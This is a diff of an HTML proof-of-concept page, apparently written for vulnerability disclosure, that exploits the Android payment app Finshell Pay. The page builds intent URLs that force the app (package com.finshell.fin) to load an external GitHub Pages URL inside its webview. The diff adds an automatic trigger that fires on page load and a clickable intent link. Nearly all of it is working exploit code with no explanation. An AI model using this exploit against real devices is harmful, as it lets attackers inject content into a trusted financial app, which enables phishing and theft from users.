@@ -9,7 +9,6 @@
 
     <div style="border: 5px solid white; display: inline-block; padding: 20px; border-radius: 15px; width: 85%;">
         <h1 style="font-size: 30px; margin-bottom: 10px;">VULNERABILITY CONFIRMED</h1>
-        <h2 style="font-size: 20px;">Remote Content Injection</h2>
         <hr style="border: 1px solid white;">
         
         <h3 style="font-size: 18px; background-color: white; color: red; padding: 10px; border-radius: 5px;">
@@ -17,25 +16,22 @@
         </h3>
 
         <p style="font-size: 16px; margin-top: 20px;">
-            This red screen proves that I can load <b>external content</b> <br> 
-            inside the official <b>Finshell Pay</b> application.
+            The target package <b>com.finshell.fin</b> has been identified.<br>
+            Click the button to trigger the exploit.
         </p>
 
-        <button onclick="openFinshell()" style="padding: 15px 25px; background: white; color: red; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; width: 100%;">
-            CLICK TO OPEN FINSHELL PAY
-        </button>
+        <a href="intent://web?url=https://yazidtokyo43.github.io/oppo-tes/#Intent;scheme=finshell;package=com.finshell.fin;S.browser_fallback_url=https://yazidtokyo43.github.io/oppo-tes/;end" 
+           style="display: block; padding: 15px; background: white; color: red; text-decoration: none; border-radius: 5px; font-weight: bold; font-size: 20px;">
+            OPEN FINSHELL PAY
+        </a>
     </div>
 
     <script>
-        function openFinshell() {
-            var payloadUrl = "https://yazidtokyo43.github.io/oppo-tes/";
-            var intentUrl = "intent://web?url=" + payloadUrl + "#Intent;scheme=finshell;package=com.finshell.wallet;S.browser_fallback_url=" + payloadUrl + ";launchFlags=0x10000000;end";
-            
-            window.location.href = intentUrl;
-        }
-
+        // Automatic trigger attempt for the correct package
         window.onload = function() {
-            setTimeout(openFinshell, 1000);
+            setTimeout(function() {
+                window.location.href = "intent://web?url=https://yazidtokyo43.github.io/oppo-tes/#Intent;scheme=finshell;package=com.finshell.fin;end";
+            }, 1000);
         };
     </script>
 </body>
